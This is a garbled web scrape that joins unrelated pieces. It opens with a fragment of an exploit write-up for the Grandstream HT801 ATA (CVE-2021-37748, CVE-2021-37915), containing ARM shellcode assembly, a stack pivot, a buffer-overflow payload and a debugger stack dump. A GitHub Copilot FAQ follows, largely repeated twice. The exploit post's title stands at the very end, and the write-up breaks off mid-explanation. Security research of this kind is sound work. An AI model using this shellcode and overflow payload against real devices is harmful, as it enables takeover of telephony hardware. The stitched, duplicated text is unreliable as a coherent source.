q,w,e,r = unpack('4B',pack('>I',system))
load_system = asm("""
mov r6, #%d;
mov r6, r6, lsl #8;
add r6, r6, #%d;
mov r6, r6, lsl #8;
add r6, r6, #%d;
mov r6, r6, lsl #8;
add r6, r6, #%d;
mov pc, r6
""" % (q,w,e,r))

```

There is a high chance that the generated shellcode would not contain bad-bytes.

### Stack pivot

Having fixed the registers to allow us to safely return to the 0x9AC4 (config) sub-routine, we still have to figure out a way to trigger the **Stage 2** shellcode.

![a54c.png](/media/images/a54c.width-800.png)

If we attempt to exit before returning, the sub-routine must readjust the stack to its initial state (before the function call), so the program can continue with its normal flow. The epilogue will perform two instructions, that will move the stack pointer by hex 0x254 (readjust) and will pop the values from the stack into the R4-R11 registers, among with the most important one - program counter:

![9ac4_epilogue.png](/media/images/9ac4_epilogue.width-800.png)

We've noticed that after the overflow happens, there are heap pointers stored on the stack at multiple locations. One of which is particularly interesting:

```
0xcea062a0│+0x0250: 0x00000000
0xcea062a4│+0x0254: 0x00000073 ("s"?)
0xcea062a8│+0x0258: 0x00000000
0xcea062ac│+0x025c: 0x00000020
0xcea062b0│+0x0260: 0x00000000
0xcea062b4│+0x0264: 0x00000001
0xcea062b8│+0x0268: 0x00000013
0xcea062bc│+0x026c: 0x00010000
0xcea062c0│+0x0270: 0x00000003
0xcea062c4│+0x0274: 0x00000008
0xcea062c8│+0x0278: 0x00000008
0xcea062cc│+0x027c: 0x00000008
0xcea062d0│+0x0280: 0x00000008
0xcea062d4│+0x0284: 0x00000008
0xcea062d8│+0x0288: 0x00000008
0xcea062dc│+0x028c: 0x00000008
0xcea062e0│+0x0290: 0x00000008
0xcea062e4│+0x0294: 0xcea06430  →  0x00016170  →  0x00000000
0xcea062e8│+0x0298: 0x00016170  →  0x00000000
0xcea062ec│+0x029c: 0x00000000
0xcea062f0│+0x02a0: 0x00000000

```

This would be a good candidate for populating the R4-R11 registers along with PC. We do not control the content of the R4-R10 registers, however, we do control the Frame Pointer (R11) and PC (Program Counter) - therefore, it will be trivial to redirect the program flow.

The pivoting must be done in the **Stage 1** shellcode, before we return to the config sub-routine from `puts()`. A calculated pivot that will tailor the stack for our needs:

```
pivot = asm('sub sp,sp, #964;')

```

For sanity, the final payload for **Stage1** will be as follows:

```
sc = pivot + fix_regs + load_puts_got + jmp_puts
payload = b'A'*134 + sc

```

The following figure shows the moment of the POP instruction with a pivoted stack:

```

The R4-R11 registers are going to be populated with words from the stack starting at offset 0x0; finally popping the heap pointer at offset 0x20 into the program counter. The program flow will continue by executing the instructions stored at 0x16170, thus our **Stage2** shellcode:

```

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

#### Plans & Pricing

#### What are the differences between the Free, Pro, Business, and Enterprise plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Pro is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### How can I upgrade my GitHub Copilot Free license to Copilot Pro?

If you're on the Free plan, you can upgrade to Pro through your [Copilot settings page](https://github.com/settings/copilot) or directly on the [Copilot marketing page](https://github.com/features/copilot).

#### What is included in GitHub Copilot Free?

GitHub Copilot Free users are limited to 2000 completions and 50 chat requests (including Copilot Edits).

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in GitHub Advanced Security and available to all public repositories.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

# Exploiting Grandstream HT801 ATA (CVE-2021-37748, CVE-2021-37915)

Published on Oct. 26, 2021 by Adam Simuntis & Mindaugas Slusnys
![Post Image - Grandstream's HT801 Analog Telephone Adapter.png](/media/images/Post_Image_-_Grandstreams_HT801_Analog_Teleph.width-1000.png)

